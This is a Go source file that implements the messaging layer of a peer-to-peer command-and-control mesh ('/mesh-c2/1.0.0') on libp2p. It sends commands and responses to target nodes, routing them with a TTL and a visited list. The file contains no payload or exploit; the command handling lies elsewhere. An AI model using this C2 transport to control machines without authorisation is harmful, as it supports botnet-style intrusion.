package protocol

import (
	"bufio"
	"context"
	"io"
	"sync"
	"time"

	"nostaliga/pkg/logger"
	"nostaliga/pkg/node"

	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
)

const ProtocolID = "/mesh-c2/1.0.0"

type CommandHandler interface {
	Handle(msg *Message) error
}

// ResponseCallback is called when a response is received
type ResponseCallback func(source, payload string)

type Protocol struct {
	node             *node.Node
	handler          CommandHandler
	responseCallback ResponseCallback
	callbackMu       sync.RWMutex
}

func NewProtocol(n *node.Node, handler CommandHandler) *Protocol {
	p := &Protocol{
		node:    n,
		handler: handler,
	}

	n.Host().SetStreamHandler(ProtocolID, p.HandleStream)
	return p
}

// SetResponseCallback sets a callback for when responses are received
func (p *Protocol) SetResponseCallback(cb ResponseCallback) {
	p.callbackMu.Lock()
	defer p.callbackMu.Unlock()
	p.responseCallback = cb
}

func (p *Protocol) HandleStream(s network.Stream) {
	defer s.Close()

	reader := bufio.NewReader(s)
	data, err := reader.ReadBytes('\n')
	if err != nil && err != io.EOF {
		return
	}

	msg, err := UnmarshalMessage(data)
	if err != nil {
		return
	}

	// Check if message already visited this node
	if msg.HasVisited(p.node.ID()) {
		return
	}

	msg.AddVisited(p.node.ID())

	// Check if message is for this node
	if msg.Target == p.node.ID().String() {
		logger.Debug("📩 Received %s", msg.Type.String())
		if err := p.handler.Handle(msg); err != nil {
			logger.Debug("Error handling command: %v", err)
		}
		return
	}

	// Route message if TTL > 0
	if msg.TTL > 0 {
		logger.Debug("🔀 Routing message to %s", msg.Target)
		p.routeMessage(msg)
	}
}

func (p *Protocol) Send(msgType MessageType, targetID, payload string) {
	msg := NewMessage(msgType, p.node.ID().String(), targetID, payload)

	// Try direct connection first
	target, err := peer.Decode(targetID)
	if err != nil {
		logger.Debug("Invalid peer ID: %v", err)
		return
	}

	if p.node.PeerManager().Has(target) {
		if err := p.sendMessage(target, msg); err == nil {
			logger.Debug("📤 %s sent directly to %s", msgType.String(), targetID)
			return
		}
	}

	// Route through mesh
	logger.Debug("🔀 Routing %s to %s", msgType.String(), targetID)	
	p.routeMessage(msg)
}

// SendCommand is a convenience wrapper for sending commands
func (p *Protocol) SendCommand(targetID, command string) {
	p.Send(MsgTypeCommand, targetID, command)
}

// SendResponse is a convenience wrapper for sending responses
func (p *Protocol) SendResponse(targetID, response string) {
	p.Send(MsgTypeResponse, targetID, response)
}

func (p *Protocol) routeMessage(msg *Message) {
	peers := p.node.PeerManager().List()
	for _, peerID := range peers {
		if !msg.HasVisited(peerID) {
			go p.sendMessage(peerID, msg)
		}
	}
}

func (p *Protocol) sendMessage(target peer.ID, msg *Message) error {
	ctx, cancel := context.WithTimeout(p.node.Context(), 5*time.Second)
	defer cancel()

	s, err := p.node.Host().NewStream(ctx, target, ProtocolID)
	if err != nil {
		return err
	}
	defer s.Close()

	data, err := msg.Marshal()
	if err != nil {
		return err
	}

	data = append(data, '\n')
	_, err = s.Write(data)
	return err
}
